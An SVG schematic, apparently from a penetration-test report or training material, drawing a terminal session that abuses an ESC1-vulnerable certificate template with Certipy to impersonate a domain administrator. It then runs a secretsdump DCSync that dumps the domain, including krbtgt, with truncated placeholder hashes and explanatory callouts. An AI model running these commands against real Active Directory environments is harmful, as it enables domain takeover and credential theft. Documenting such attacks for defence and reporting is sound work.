<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 820 480" width="820" height="480" role="img" aria-labelledby="t d">
  <title id="t">Terminal schematic, ADCS ESC1 and DCSync</title>
  <desc id="d">A drawn terminal window. Certipy finds the vulnerable certificate template, then requests a certificate specifying a domain administrator as the subject, and the certificate authority issues it. The certificate is used to authenticate and retrieve the domain administrator's hash, which is then used to run a DCSync that dumps the domain including the krbtgt account. Numbered callouts point to the vulnerable template, the issued certificate, and the DCSync. A footer states this is a schematic illustration and not a screen capture.</desc>
  <style>
    text { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; }
    .mono { font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace; }
    .h1 { fill: #1f2328; font-size: 15px; font-weight: 600; }
    .sub{ fill: #656d76; font-size: 11px; }
    .term { fill: #0d1117; stroke: #30363d; stroke-width: 1.3; }
    .bar  { fill: #161b22; stroke: #30363d; stroke-width: 1.2; }
    .prompt { fill: #7ee787; font-size: 12px; }
    .cmd  { fill: #e6edf3; font-size: 12px; }
    .out  { fill: #c9d1d9; font-size: 11.5px; }
    .hi   { fill: #ffa657; font-size: 11.5px; font-weight: 700; }
    .ok   { fill: #7ee787; font-size: 11.5px; }
    .red  { fill: #ff7b72; font-size: 11.5px; font-weight: 700; }
    .dim  { fill: #8b949e; font-size: 11.5px; }
    .cnum { fill: #ffffff; font-size: 11px; font-weight: 700; text-anchor: middle; }
    .cc   { fill: #cf222e; stroke: #ffffff; stroke-width: 1.2; }
    .clbl { fill: #a40e26; font-size: 10.5px; font-weight: 700; }
    .foot { fill: #656d76; font-size: 10.5px; font-style: italic; }
    @media (prefers-color-scheme: dark) {
      .h1 { fill: #e6edf3; } .sub { fill: #8b949e; } .foot { fill: #8b949e; } .clbl { fill: #ff7b72; }
    }
  </style>
  <text class="h1"  x="20" y="26">ADCS abuse terminal</text>
  <text class="sub" x="20" y="44">Certipy for the certificate, then DCSync to dump the domain.</text>

  <rect class="term" x="20" y="58" width="600" height="392" rx="7"/>
  <rect class="bar"  x="20" y="58" width="600" height="26" rx="7"/>
  <circle cx="36" cy="71" r="4.5" fill="#ff5f56"/>
  <circle cx="52" cy="71" r="4.5" fill="#ffbd2e"/>
  <circle cx="68" cy="71" r="4.5" fill="#27c93f"/>
  <text class="mono dim" x="290" y="75">kali@kali: ~ (via pivot)</text>

  <text class="mono prompt" x="34" y="106">$ <tspan class="cmd">certipy find -vulnerable -u jdoe@harbor.local</tspan></text>
  <text class="mono out" x="34" y="126">[*] Finding certificate templates...</text>
  <text class="mono hi"  x="34" y="144">[!] HarborWebEnroll : ESC1</text>
  <text class="mono dim" x="50" y="162">Enrollee supplies subject: True</text>
  <text class="mono dim" x="50" y="180">Client authentication:  True</text>
  <text class="mono dim" x="50" y="198">Enrollment rights:      Domain Users</text>

  <text class="mono prompt" x="34" y="228">$ <tspan class="cmd">certipy req -template HarborWebEnroll \</tspan></text>
  <text class="mono cmd" x="50" y="246">-upn administrator@harbor.local</text>
  <text class="mono ok"  x="34" y="266">[*] Certificate issued for 'administrator'</text>
  <text class="mono ok"  x="34" y="284">[*] Saved to administrator.pfx</text>

  <text class="mono prompt" x="34" y="314">$ <tspan class="cmd">certipy auth -pfx administrator.pfx</tspan></text>
  <text class="mono ok"  x="34" y="332">[*] Got hash for 'administrator@harbor.local'</text>

  <text class="mono prompt" x="34" y="362">$ <tspan class="cmd">secretsdump.py -just-dc administrator@DC01</tspan></text>
  <text class="mono red" x="34" y="382">Administrator:500:aad3b...:31d6c...</text>
  <text class="mono red" x="34" y="400">krbtgt:502:aad3b...:8a6f2...</text>
  <text class="mono dim" x="34" y="418">[*] Cleaning up... domain dumped</text>
  <text class="mono prompt" x="34" y="438">$ <tspan class="cmd">_</tspan></text>

  <!-- callouts -->
  <circle class="cc" cx="646" cy="144" r="12"/><text class="cnum" x="646" y="148">1</text>
  <text class="clbl" x="664" y="141">Vulnerable</text>
  <text class="clbl" x="664" y="155">template found</text>

  <circle class="cc" cx="646" cy="266" r="12"/><text class="cnum" x="646" y="270">2</text>
  <text class="clbl" x="664" y="263">Cert issued as</text>
  <text class="clbl" x="664" y="277">the administrator</text>

  <circle class="cc" cx="646" cy="391" r="12"/><text class="cnum" x="646" y="395">3</text>
  <text class="clbl" x="664" y="388">DCSync, the whole</text>
  <text class="clbl" x="664" y="402">domain, incl krbtgt</text>

  <text class="foot" x="20" y="472">Schematic illustration of terminal output, not a screen capture. Hashes shown are placeholders. The demonstration stopped at proof.</text>
</svg>
